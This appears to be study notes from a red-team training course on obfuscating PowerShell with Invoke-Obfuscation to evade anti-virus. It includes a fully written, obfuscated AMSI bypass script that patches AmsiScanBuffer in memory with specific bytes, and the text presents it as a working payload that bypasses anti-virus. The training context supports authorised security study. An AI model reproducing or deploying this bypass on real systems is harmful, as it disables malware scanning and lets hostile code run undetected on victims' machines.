Now that we have bypassed AMSI, we need to obfuscate and modify our launcher and grunt code to evade anti-virus. We will begin by understanding the basics of using automated obfuscators like `Invoke-Obfuscation` and `ISE-Steroids` to perform advanced string and signature manipulation.  

We again recommend using a development virtual machine to test and edit code.  

## Obfuscating AMSI bypass code

Invoke-Obfuscation, [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), is a utility built by Daniel Bohannon and Cobbr. It is used to take a series of arguments/obfuscation tokens and automatically obfuscate provided code. From their GitHub, *"Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator."*. Red teamers can use obfuscation to make reverse engineering/analysis harder and, in some cases, bypass anti-virus and other detections.  

Invoke-Obfuscation syntax can seem very large and scary at first if you don't understand how it breaks down the obfuscation tokens. We can follow along with this guide created by the author of Invoke-Obfuscation to get familiar with the syntax [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide).  

To begin our obfuscation attempts, we will need to set the script block or the payload we want to obfuscate and then specify tokens to use. Invoke-Obfuscation offers both an argument parsing command-line tool as well as a friendly CLI (Command Line Interface). For our purposes, we will be using the command line. We will only be covering an example of using a token to bypass anti-virus, creating a token command, and the various use cases are out of scope for this task.  

Below is the command we will use to obfuscate our payload. The token command used at the time of writing will bypass anti-virus for some payloads or tools. We will be breaking this command down later in this task.

`Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit`

To break it down:

- `-ScriptPath` points to the PowerShell script to obfuscate
    
    - `-ScriptBlock {'<PAYLOAD>'}` will also work for obfuscating scripts or commands directly
- `-Command` is where we string together our obfuscation commands:
    
    - `Token\\String\\1` relates to the first string obfuscation under the token section… it simply concatenates the string. Below is a screenshot of the output of STRING in the _CLI_:  
        ![[Task 33 - JU57 0BFU$C47E 1T-20241012062100154.webp]]
        
    - `2` relates to the 2nd option in the screenshot above, `Reorder` – if you do not supply the full ‘path’ to next obfuscation command (e.g. `Token\\String\\2`) it will append the path from the previous command depending on what is missing…
        
    - `Token\\Variable\\1` relates to the 1st VARIABLE type of TOKEN, and will . As mentioned above, since we left off `Token\\` it has appeneded it from the previous command:  
        ![[Task 33 - JU57 0BFU$C47E 1T-20241012062351572.webp]]
        
    - `Token\\Whitespace\\1` adds random whitespaces between the concatenation:  
	    ![[Task 33 - JU57 0BFU$C47E 1T-20241012062242516.webp]]
        
- `-Quiet` simply makes the output less verbose
    
- `-NoExit` ensures that you don’t exit from **Invoke-Obfuscation**‘s _CLI_ after it has obfuscated the code to your liking.

---
### Further Obfuscated **amsi_bypass.ps1**

`${methODdEf<code>i`
`NI`
`T`
`ion} =   ('`
`' + '`
 `' + ' '+' ' +  ' ' +  ("[DllImport(`
`"kernel32`
`")]`
 `"+  '') +  ' '+' '  +  ' ' +  'p'  + (  "{1}{0}"-f 'ic ','ubl' ) +  'st'+ ( "{1}{0}" -f'c ','ati') +(  "{0}{1}"-f 'ext','ern' ) +' '+  'Int' + ( "{0}{1}"-f 'P','tr ' )  + ("{0}{1}"-f 'G','etPr'  )+'oc' +'Ad'+  'dre'+  's'+  's'+( ( ("{2}{0}{1}"-f'r',' ','(IntPt' )  )) +  (  "{1}{0}"-f 'od','hM'  )+ ("{1}{0}" -f'e,','ul')  +' '+  ("{1}{0}" -f 'tri','s')  +'n','am','ro' +'cN' + ((( "{1}{0}{2}"-f 'e);`
`') ) )  + '`
`'+' '+' ' + ' '  + ' '  +  (  "[DllImport(`
`"kernel32`
`")]`
 `" + ''  )+ ' '+ ' ' +' '+  'pu'+'b' +  ("{0}{1}" -f'lic',' ' )+'st'  +  ( "{1}{0}"-f 'c ','ati')+'ext' +'er' +'n '+ 'In'  +  (  "{0}{1}" -f'tP','tr '  )  + ("{1}{0}" -f'ule','GetMod'  )+ (  "{0}{1}"-f'Ha','ndl'  )+  'e(s' +("{1}{0}"-f'ng','tri' )+' '  + 'lpM' +( "{0}{1}"-f 'odu','leN' ) + 'a' +  'm'  +  'e'+  (  (( "{1}{2}{0}"-f'`
 `',');','`
`')  )) + ' '  +' '+' '  +  ( "[DllImport(`
`"kernel32`
`")]`
 `"+''  )  + ' '+' '+' '+  'pub'+  ("{0}{1}" -f 'lic',' ' ) + 'sta'  +("{1}{0}" -f ' ','tic'  )+'ex'+ (  "{0}{1}"-f'ter','n ' ) +  'b'+(  "{0}{1}"-f'o','ol '  )  +(  "{1}{0}" -f'u','Virt' ) +'al'  +  (  "{2}{0}{1}"-f'ot','ec','Pr')+ ((  ( "{1}{0}" -f 'IntP','t('  )) ) + 'tr '  +( "{0}{2}{1}"-f'lpA','es','ddr') +'s,'  + ' '+'U'  +( "{0}{1}"-f'In','tP'  )+ 'tr '+'d' +("{0}{1}" -f 'wSiz','e,' )+  ' ' +'u' +( "{0}{1}"-f 'int',' ')  + 'f'+ (  "{2}{1}{0}" -f'ot','Pr','lNew'  ) +  ("{1}{0}"-f',','ect') + ' '  +'out'  + ' '+  'uin'+ 't '+  'l'+  (  "{0}{1}" -f 'pflO','ldP' )  +  ( (  ( "{1}{0}{2}"-f 'ect)','rot',';') )  )  +'`
`'  )  ;`

`${ke`
`RN`
`El32}  =   Add-Type -MemberDefinition ${METhODd`
`EfIN`
`I`TioN} -Name ('K'+ 'ern' +( "{1}{0}" -f'2','el3')  ) -NameSpace (("{0}{1}" -f'Win','3' )+ '2' ) -PassThru  ;`
`${a`BSd}  =   (  'Ams'+'iS'  ) + (  'ca'+'nB' +  ( "{0}{1}"-f'uffe','r'  )  );`
`${H`
`An`
`DLe}   =  [Win32.Kernel32]::GetModuleHandle( (  'a'+( "{2}{0}{1}"-f '.d','ll','msi'  )) );`
`[IntPtr]${Buf`
`F`
`Er`
`A`
`DDREss} = [Win32.Kernel32]::GetProcAddress( ${H`
`AN`
`dle}, ${Ab`SD}) ;`
`[UInt32]${S`iZE}  = 0x5;`
`[UInt32]${pROTECT`
`F`
`lAg}   =   0x40;`
`[UInt32]${o`
`ldpROTE`
`cT`
`Fl`
`Ag}  =  0;`
`[Win32.Kernel32]::VirtualProtect( ${BuF`
`FerADDr`
`eSS}, ${Si`
`zE}, ${prOTeC`
`TFL`
`Ag}, [Ref]${oLd`
`pr`
`oT`
`EC`TFlag}  ) ;`
`${b`Uf}  =  [Byte[]]( [UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3  ) ;`
`[PSObject].Assembly.GetType( ( ("{1}{0}"-f'st','Sy'  ) +'em'+'.Ma' +  ("{0}{1}"-f'nage','m'  )+ 'ent'  +'.A' +'uto' +("{0}{1}" -f 'mation.T','y')  +'p'+'eA'  + 'cc'+  'e'  +  ("{0}{1}" -f'l','era' )+  ( "{1}{0}" -f's','tor'  )  )  )::Add(  ((  "{0}{1}"-f 'd','1ks')+'t1k' ), [system.runtime.interopservices.marshal]  )`
`[d1kst1k]::copy(  ${B`
`Uf}, 0, ${b`
`UffeR`
`AdD`
`R`Ess}, 6)  ; 4`


If obfuscated efficiently, you should now have a successful PowerShell payload that will bypass anti-virus and make reverse engineering harder. Before executing on a production environment, you should always experiment and test on your development server to ensure that everything goes smoothly during the actual production engagement.  

In the next task, we will cover what you can do when obfuscation fails, or you need to use something that isn't purely written in PowerShell by utilizing code review and ThreatCheck/DefenderCheck.

**Next step:** [[Task 34 - 'Ca' + 'n' + 'you' + ' ' + 'see' + 'me now' + '?']]
